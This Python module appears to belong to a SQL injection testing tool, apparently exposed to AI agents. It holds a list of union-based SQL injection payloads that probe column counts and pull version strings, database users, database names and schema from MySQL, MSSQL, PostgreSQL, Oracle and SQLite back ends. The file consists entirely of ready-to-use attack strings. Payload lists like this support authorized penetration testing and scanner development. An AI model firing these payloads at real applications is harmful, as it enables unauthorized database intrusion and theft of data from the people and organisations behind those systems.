"""Union-based SQL injection payloads."""

from sqli_mcp.models import Payload, InjectionType, DatabaseType

UNION_BASED_PAYLOADS: list[Payload] = [
    # Column count detection
    Payload(
        value="' ORDER BY 1-- -",
        injection_type=InjectionType.UNION_BASED,
        database_type=DatabaseType.GENERIC,
        description="Order by column 1"
    ),
    Payload(
        value="' ORDER BY 5-- -",
        injection_type=InjectionType.UNION_BASED,
        database_type=DatabaseType.GENERIC,
        description="Order by column 5"
    ),
    Payload(
        value="' ORDER BY 10-- -",
        injection_type=InjectionType.UNION_BASED,
        database_type=DatabaseType.GENERIC,
        description="Order by column 10"
    ),
    
    # MySQL UNION injection
    Payload(
        value="' UNION SELECT NULL-- -",
        injection_type=InjectionType.UNION_BASED,
        database_type=DatabaseType.MYSQL,
        description="UNION with 1 NULL column"
    ),
    Payload(
        value="' UNION SELECT NULL,NULL-- -",
        injection_type=InjectionType.UNION_BASED,
        database_type=DatabaseType.MYSQL,
        description="UNION with 2 NULL columns"
    ),
    Payload(
        value="' UNION SELECT NULL,NULL,NULL-- -",
        injection_type=InjectionType.UNION_BASED,
        database_type=DatabaseType.MYSQL,
        description="UNION with 3 NULL columns"
    ),
    Payload(
        value="' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
        injection_type=InjectionType.UNION_BASED,
        database_type=DatabaseType.MYSQL,
        description="UNION with 5 NULL columns"
    ),
    Payload(
        value="' UNION SELECT 1,2,3,4,5-- -",
        injection_type=InjectionType.UNION_BASED,
        database_type=DatabaseType.MYSQL,
        description="UNION with numeric markers"
    ),
    Payload(
        value="' UNION SELECT @@version,NULL,NULL-- -",
        injection_type=InjectionType.UNION_BASED,
        database_type=DatabaseType.MYSQL,
        description="MySQL version extraction via UNION"
    ),
    Payload(
        value="' UNION SELECT user(),database(),version()-- -",
        injection_type=InjectionType.UNION_BASED,
        database_type=DatabaseType.MYSQL,
        description="MySQL info extraction"
    ),
    
    # MSSQL UNION injection
    Payload(
        value="' UNION SELECT @@version,NULL,NULL-- -",
        injection_type=InjectionType.UNION_BASED,
        database_type=DatabaseType.MSSQL,
        description="MSSQL version extraction via UNION"
    ),
    Payload(
        value="' UNION SELECT SYSTEM_USER,NULL,NULL-- -",
        injection_type=InjectionType.UNION_BASED,
        database_type=DatabaseType.MSSQL,
        description="MSSQL user extraction"
    ),
    
    # PostgreSQL UNION injection
    Payload(
        value="' UNION SELECT version(),NULL,NULL-- -",
        injection_type=InjectionType.UNION_BASED,
        database_type=DatabaseType.POSTGRESQL,
        description="PostgreSQL version via UNION"
    ),
    Payload(
        value="' UNION SELECT current_user,current_database(),version()-- -",
        injection_type=InjectionType.UNION_BASED,
        database_type=DatabaseType.POSTGRESQL,
        description="PostgreSQL info extraction"
    ),
    
    # Oracle UNION injection
    Payload(
        value="' UNION SELECT NULL FROM dual-- -",
        injection_type=InjectionType.UNION_BASED,
        database_type=DatabaseType.ORACLE,
        description="Oracle UNION with dual"
    ),
    Payload(
        value="' UNION SELECT banner,NULL FROM v$version WHERE ROWNUM=1-- -",
        injection_type=InjectionType.UNION_BASED,
        database_type=DatabaseType.ORACLE,
        description="Oracle version extraction"
    ),
    
    # SQLite UNION injection
    Payload(
        value="' UNION SELECT sqlite_version(),NULL,NULL-- -",
        injection_type=InjectionType.UNION_BASED,
        database_type=DatabaseType.SQLITE,
        description="SQLite version via UNION"
    ),
    Payload(
        value="' UNION SELECT sql FROM sqlite_master-- -",
        injection_type=InjectionType.UNION_BASED,
        database_type=DatabaseType.SQLITE,
        description="SQLite schema extraction"
    ),
    
    # Alternative syntax
    Payload(
        value="') UNION SELECT NULL,NULL,NULL-- -",
        injection_type=InjectionType.UNION_BASED,
        database_type=DatabaseType.GENERIC,
        description="UNION with closing parenthesis"
    ),
    Payload(
        value="')) UNION SELECT NULL,NULL,NULL-- -",
        injection_type=InjectionType.UNION_BASED,
        database_type=DatabaseType.GENERIC,
        description="UNION with double parenthesis"
    ),
]
